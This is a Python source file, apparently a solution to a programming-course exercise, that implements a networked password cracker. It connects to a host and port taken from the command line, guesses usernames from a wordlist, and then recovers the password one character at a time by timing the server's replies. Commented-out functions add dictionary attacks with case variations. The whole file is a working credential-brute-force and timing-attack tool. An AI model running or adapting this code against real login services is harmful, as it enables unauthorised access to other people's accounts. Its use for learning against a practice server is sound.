import sys
import socket
import itertools
import string
import json
from datetime import datetime

def upper_lower(word):
    word = list(word)
    word_list = []
    for _ in range(len(word)):
        word_list.append([])
        word_list[_].append(word[_])
        if word[_].isalpha():
            word_list[_].append(word[_].swapcase())
    return word_list


def print_json_log_pas(obj):
    print(json.dumps(obj))


class PasswordHacker:
    def __init__(self, _address):
        self.address = _address
        self.response = "Wrong login!"
        self.char_num = string.ascii_letters + string.digits
        self.dictionary_logins = []
        with open('logins.txt', 'r') as dic_logins:
            for line in dic_logins.readlines():
                self.dictionary_logins.append(line.strip("\n"))
        self.dictionary_passwords = []
        with open('passwords.txt', 'r') as dic_pasws:
            for line in dic_pasws.readlines():
                self.dictionary_passwords.append(line.strip("\n"))
        self.authorizing_message = {
            "login": ' ',
            "password": ' '
        }
        with socket.socket() as self.client_socket:
            self.client_socket.connect(self.address)
            self.authorizing_message["login"] = self.dictionary_login_brute_force()
            self.brute_force_letters()
            print_json_log_pas(self.authorizing_message)

    def brute_force_letters(self):
        pasw = []
        while self.response != "Connection success!":
            if pasw:
                letter_brute_force = itertools.product(["".join(pasw)], list(self.char_num))
            else:
                letter_brute_force = itertools.product(self.char_num)
            for ch in letter_brute_force:
                self.authorizing_message["password"] = "".join(ch)
                self.send_message_json(self.authorizing_message)
                start = datetime.now()
                self.get_response()
                finish = datetime.now()
                difference = finish - start
                if difference.microseconds >= 90000 or self.response == "Connection success!":
                    pasw.append("".join(ch)[-1])
                    break

    # def brute_force_pass(self):
    #     i = 2
    #     while not self.correct_password():
    #         brute_force = itertools.chain(itertools.product(self.char_num[0], self.char_num[1:-1]))
    #         for n in brute_force:
    #             pasw = "".join(n)
    #             self.authorizing_message["password"] = pasw
    #             self.send_message_json(self.authorizing_message)
    #             self.get_response()
    #             if self.correct_password():
    #                 return pasw
    #         i += 1

    def dictionary_login_brute_force(self):
        for login in self.dictionary_logins:
            self.authorizing_message["login"] = login
            self.send_message_json(self.authorizing_message)
            self.get_response()
            if self.correct_login():
                return login

    # def dictionary_password_brute_force(self):
    #     for word in self.dictionary_passwords:
    #         dictionary_brute_force = upper_lower(word)
    #         for n in itertools.product(*dictionary_brute_force):
    #             pasw = "".join(n)
    #             self.send_message(pasw.encode('utf-8'))
    #             self.get_response()
    #             if self.response == "Connection success!":
    #                 print(pasw)
    #                 return pasw

    # def send_message(self, message):
    #     self.client_socket.send(message)

    def send_message_json(self, obj):
        self.client_socket.send(json.dumps(obj).encode('utf-8'))

    def get_response(self):
        self.response = json.loads(self.client_socket.recv(1024).decode('utf8'))['result']

    def correct_login(self):
        return True if self.response != "Wrong login!" else False

    def correct_password(self):
        return False if self.response == "Wrong password!" or self.response == "Exception happened during login" \
            else True

    def found_exception(self):
        return True if self.response == "Exception happened during login" else False


# char_num = string.ascii_letters + string.digits
# char_num = list(char_num)
# char_num.append(char_num[0])
# char_num.remove('x')
# char_num[0] = 'x'
args = sys.argv
address = (args[1], int(args[2]))
# message = args[3].encode()
hackER = PasswordHacker(address)
